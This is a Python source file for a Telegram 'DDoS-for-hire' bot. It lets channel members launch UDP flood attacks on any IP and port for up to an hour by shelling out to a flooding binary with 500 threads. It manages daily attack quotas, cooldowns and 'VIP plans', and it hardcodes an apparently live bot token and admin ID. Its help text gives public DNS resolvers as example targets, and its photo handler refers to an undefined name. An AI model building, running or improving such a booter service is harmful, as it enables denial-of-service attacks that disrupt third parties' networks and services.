#!/usr/bin/env python3
import os
import telebot
import subprocess
import threading
import time
import re
import json
from datetime import datetime, timedelta
from flask import Flask, jsonify
from collections import defaultdict

# ===== CONFIGURATION =====
BOT_TOKEN = "8465888841:AAGbZ_TubqCXmO1sUGaNHCNlWJQcZpTN7iU"  # Change this!
ADMIN_IDS = [6293907676]  # Change to your Telegram ID
CHANNEL_USERNAME = "@FREEBOTS36"  # Your channel

# Attack settings
THREAD_COUNT = 500
MAX_CONCURRENT = 3
DAILY_LIMIT = 20
COOLDOWN_SECONDS = 60

# User tracking
user_attacks = defaultdict(int)
user_cooldown = {}
user_last_attack = {}
active_attacks = 0
attack_lock = threading.Lock()

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Flask app for monitoring
app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head><title>PRIME DDOS BOT</title></head>
    <body style="background: #0a0a0a; color: #00f2ff; font-family: monospace;">
        <h1>🔥 PRIME DDOS BOT 🔥</h1>
        <p>Status: <span style="color: green;">● ONLINE</span></p>
        <p>Active Attacks: {}</p>
        <p>Total Users: {}</p>
        <hr>
        <p>Powered by @PRIME_X_ARMY</p>
    </body>
    </html>
    '''.format(active_attacks, len(user_attacks))

@app.route('/stats')
def stats():
    return jsonify({
        'active_attacks': active_attacks,
        'total_users': len(user_attacks),
        'status': 'online'
    })

def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False)

# ===== HELPER FUNCTIONS =====
def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(p) <= 255 for p in parts)
    return False

def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and 1 <= int(duration) <= 3600

def check_channel_membership(user_id):
    """Check if user has joined required channel"""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def run_attack(ip, port, duration, user_id, username):
    global active_attacks
    
    try:
        cmd = f"./bgmi {ip} {port} {duration} {THREAD_COUNT}"
        print(f"[+] Attack started by {username}: {cmd}")
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for attack to complete
        stdout, stderr = process.communicate()
        
        # Send completion message
        bot.send_message(
            user_id,
            f"✅ *Attack Completed!*\n\n"
            f"📍 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Threads: {THREAD_COUNT}\n\n"
            f"💪 Keep supporting @PRIME_X_ARMY!",
            parse_mode="Markdown"
        )
        
        print(f"[+] Attack completed by {username} on {ip}:{port}")
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Attack failed: {str(e)}")
        print(f"[-] Attack failed for {username}: {e}")
    finally:
        with attack_lock:
            active_attacks -= 1

# ===== BOT COMMANDS =====
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    # Check channel membership
    if not check_channel_membership(user_id):
        bot.reply_to(
            message,
            f"⚠️ *Join Channel First!*\n\n"
            f"Please join {CHANNEL_USERNAME} to use this bot.\n\n"
            f"After joining, send /start again.",
            parse_mode="Markdown"
        )
        return
    
    welcome_msg = f"""
🔥 *PRIME DDOS BOT* 🔥

Welcome {username}!

✅ *Status:* Active
🚀 *Type:* UDP Flood
⚡ *Performance:* High Speed

📌 *Commands:*
/bgmi <IP> <PORT> <TIME> - Start attack
/status - Check your limits
/plan - View your plan
/help - Show help

💡 *Example:*
`/bgmi 1.1.1.1 80 60`

👑 *Owner:* @XDFLASHERV6
    """
    
    bot.reply_to(message, welcome_msg, parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def attack_command(message):
    global active_attacks
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    # Check channel membership
    if not check_channel_membership(user_id):
        bot.reply_to(
            message,
            f"⚠️ *Join {CHANNEL_USERNAME} first!*",
            parse_mode="Markdown"
        )
        return
    
    # Parse command
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(
                message,
                "❌ *Invalid Format!*\n\n"
                "Usage: `/bgmi <IP> <PORT> <TIME>`\n"
                "Example: `/bgmi 1.1.1.1 80 60`",
                parse_mode="Markdown"
            )
            return
        
        ip, port, duration = args
        
        # Validate inputs
        if not is_valid_ip(ip):
            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode="Markdown")
            return
        
        if not is_valid_port(port):
            bot.reply_to(message, "❌ *Invalid port! (1-65535)*", parse_mode="Markdown")
            return
        
        if not is_valid_duration(duration):
            bot.reply_to(message, "❌ *Invalid duration! (1-3600 seconds)*", parse_mode="Markdown")
            return
        
        duration = int(duration)
        port = int(port)
        
        # Check cooldown
        if user_id in user_cooldown:
            cooldown_end = user_cooldown[user_id]
            if datetime.now() < cooldown_end:
                remaining = int((cooldown_end - datetime.now()).total_seconds())
                bot.reply_to(
                    message,
                    f"⏰ *Cooldown Active!*\n\nPlease wait {remaining} seconds before next attack.",
                    parse_mode="Markdown"
                )
                return
        
        # Check daily limit
        today = datetime.now().strftime('%Y-%m-%d')
        if user_attacks[f"{user_id}_{today}"] >= DAILY_LIMIT:
            remaining = DAILY_LIMIT - user_attacks[f"{user_id}_{today}"]
            bot.reply_to(
                message,
                f"📊 *Daily Limit Reached!*\n\n"
                f"You have used {DAILY_LIMIT}/{DAILY_LIMIT} attacks today.\n"
                f"Reset at midnight IST.",
                parse_mode="Markdown"
            )
            return
        
        # Check concurrent attacks
        if active_attacks >= MAX_CONCURRENT:
            bot.reply_to(
                message,
                f"⚠️ *Server Busy!*\n\n"
                f"{active_attacks}/{MAX_CONCURRENT} attacks running.\n"
                f"Please wait a moment.",
                parse_mode="Markdown"
            )
            return
        
        # Update counters
        user_attacks[f"{user_id}_{today}"] += 1
        user_cooldown[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_SECONDS)
        user_last_attack[user_id] = datetime.now()
        
        with attack_lock:
            active_attacks += 1
        
        # Send confirmation
        remaining_attacks = DAILY_LIMIT - user_attacks[f"{user_id}_{today}"]
        
        confirm_msg = f"""
🚀 *ATTACK LAUNCHED!* 🚀

🎯 *Target:* `{ip}:{port}`
⏱️ *Duration:* {duration} seconds
🔧 *Threads:* {THREAD_COUNT}
📊 *Remaining Today:* {remaining_attacks}/{DAILY_LIMIT}

💪 *Keep Supporting @PRIME_X_ARMY!*
📸 *Send feedback after attack!*
        """
        
        bot.reply_to(message, confirm_msg, parse_mode="Markdown")
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=run_attack,
            args=(ip, port, duration, user_id, username)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        print(f"Error in attack command: {e}")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    today = datetime.now().strftime('%Y-%m-%d')
    
    attacks_used = user_attacks[f"{user_id}_{today}"]
    remaining = DAILY_LIMIT - attacks_used
    
    # Check cooldown
    cooldown_status = "Ready"
    if user_id in user_cooldown:
        cooldown_end = user_cooldown[user_id]
        if datetime.now() < cooldown_end:
            remaining_cd = int((cooldown_end - datetime.now()).total_seconds())
            cooldown_status = f"{remaining_cd} seconds"
    
    status_msg = f"""
📊 *YOUR STATUS* 📊

👤 *User:* {message.from_user.first_name}
🎯 *Plan:* VIP
━━━━━━━━━━━━━━━━

⚔️ *Today's Attacks:* {attacks_used}/{DAILY_LIMIT}
📊 *Remaining:* {remaining}
⏰ *Cooldown:* {cooldown_status}
🟢 *Server Status:* Active
🚀 *Concurrent Attacks:* {active_attacks}/{MAX_CONCURRENT}

━━━━━━━━━━━━━━━━
💪 *Keep Supporting @PRIME_X_ARMY!*
    """
    
    bot.reply_to(message, status_msg, parse_mode="Markdown")

@bot.message_handler(commands=['plan'])
def plan_command(message):
    plan_msg = """
💎 *YOUR PLAN DETAILS* 💎

👑 *Plan:* PRIME VIP
━━━━━━━━━━━━━━━━

✅ *Features:*
• Daily Attacks: 20
• Concurrent: 3 attacks
• UDP Flood Method
• High Threads: 500
• Priority Support

💎 *Benefits:*
• 24/7 Server Uptime
• Fast Response
• Premium Support

━━━━━━━━━━━━━━━━
👑 *Owner:* @XDFLASHERV6
    """
    
    bot.reply_to(message, plan_msg, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_msg = """
📚 *PRIME DDOS BOT HELP* 📚

━━━━━━━━━━━━━━━━━━━━━

🎯 *Attack Command:*
`/bgmi <IP> <PORT> <TIME>`

📝 *Examples:*
• `/bgmi 1.1.1.1 80 60`
• `/bgmi 8.8.8.8 53 120`

━━━━━━━━━━━━━━━━━━━━━

⚙️ *Parameters:*
• IP: Valid IPv4 address
• PORT: 1-65535
• TIME: 1-3600 seconds

━━━━━━━━━━━━━━━━━━━━━

📊 *Other Commands:*
• /status - Check your limits
• /plan - View your plan
• /help - Show this menu

━━━━━━━━━━━━━━━━━━━━━

⚠️ *Rules:*
1. Join @FREEBOTS36
2. Send photo feedback
3. Don't spam attacks

💪 *Happy Attacking!*
    """
    
    bot.reply_to(message, help_msg, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Forward to admin
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(
                admin_id,
                f"📸 *Feedback Received!*\n\n"
                f"👤 User: @{XDFLASHERV6}\n"
                f"🆔 ID: {6293907676}",
                parse_mode="Markdown"
            )
            bot.forward_message(admin_id, message.chat.id, message.message_id)
        except:
            pass
    
    bot.reply_to(
        message,
        f"✅ *Feedback Received!*\n\n"
        f"Thank you @{XDFLASHERV6} for your support!\n"
        f"💪 Keep attacking with @XDFLASHERV6!",
        parse_mode="Markdown"
    )

# ===== MAIN =====
if __name__ == "__main__":
    print("🔥 Starting PRIME DDOS BOT...")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Admin IDs: {ADMIN_IDS}")
    print(f"Channel: {CHANNEL_USERNAME}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Start Flask thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Web server started on port 8080")
    
    # Start bot
    print("✅ Bot is running!")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        bot.infinity_polling(timeout=60, interval=1)
    except KeyboardInterrupt:
        print("\n❌ Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot error: {e}")